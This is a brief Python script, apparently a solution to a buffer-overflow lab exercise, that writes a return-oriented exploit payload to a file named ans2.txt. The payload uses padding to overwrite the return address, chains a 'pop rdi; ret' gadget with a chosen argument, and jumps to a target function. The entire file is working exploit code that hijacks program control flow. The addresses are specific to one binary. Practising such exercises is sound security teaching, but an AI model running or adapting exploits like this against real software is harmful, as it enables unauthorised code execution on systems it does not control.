import struct
p64 = lambda x: struct.pack("<Q", x)

padding = b"A" * 16
pop_rdi_ret = p64(0x4012c7)
arg = p64(0x3f8)
func2 = p64(0x401216)

payload = padding + pop_rdi_ret + arg + func2
payload = payload.ljust(0x38, b"B")  

with open("ans2.txt", "wb") as f:
    f.write(payload)
